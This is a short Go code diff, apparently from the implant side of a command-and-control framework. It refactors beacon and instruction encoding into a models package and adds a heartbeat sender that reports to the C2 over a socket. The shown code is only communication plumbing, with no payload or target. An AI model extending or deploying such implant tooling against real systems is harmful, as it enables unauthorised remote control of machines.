@@ -2,7 +2,6 @@ package main
 
 import (
 	"bufio"
-	"encoding/json"
 	"fmt"
 	"net"
 	"time"
@@ -22,16 +21,10 @@ func CloseConnection(connection net.Conn) (err error) {
 	return
 }
 
-// EncodeBeacon encodes a beacon response as a byte array for sending to the C2
-func EncodeBeacon(beacon models.Beacon) (beaconBytes []byte, err error) {
-	beaconBytes, err = json.Marshal(beacon)
-	return
-}
-
 // SendBeacon sends a beacon response to the C2
 func SendBeacon(beacon models.Beacon, connection net.Conn) (err error) {
 	beacon.SentAt = time.Now()
-	dataBytes, jsonErr := EncodeBeacon(beacon)
+	dataBytes, jsonErr := models.EncodeBeacon(beacon)
 	if jsonErr != nil {
 		return jsonErr
 	}
@@ -39,10 +32,14 @@ func SendBeacon(beacon models.Beacon, connection net.Conn) (err error) {
 	return
 }
 
-
-// DecodeInstruction decodes instructions sent from the C2
-func DecodeInstruction(data []byte) (beacon *models.Instruction, err error) {
-	err = json.Unmarshal(data, &beacon)
+// SendHeartbeat sends a beacon response to the C2
+func SendHeartbeat(heartbeat models.Heartbeat, connection net.Conn) (err error) {
+	heartbeat.SentAt = time.Now()
+	dataBytes, jsonErr := models.EncodeHeartbeat(heartbeat)
+	if jsonErr != nil {
+		return jsonErr
+	}
+	_, err = connection.Write(append(dataBytes, []byte{0xff}...))
 	return
 }
 
@@ -59,7 +56,7 @@ func WaitForInstruction(connection net.Conn) (instruction models.Instruction, er
     buffer = buffer[:len(buffer)-1]
 	}
 
-	i, err := DecodeInstruction(buffer)
+	i, err := models.DecodeInstruction(buffer)
 	instruction = *i
 	return
 }
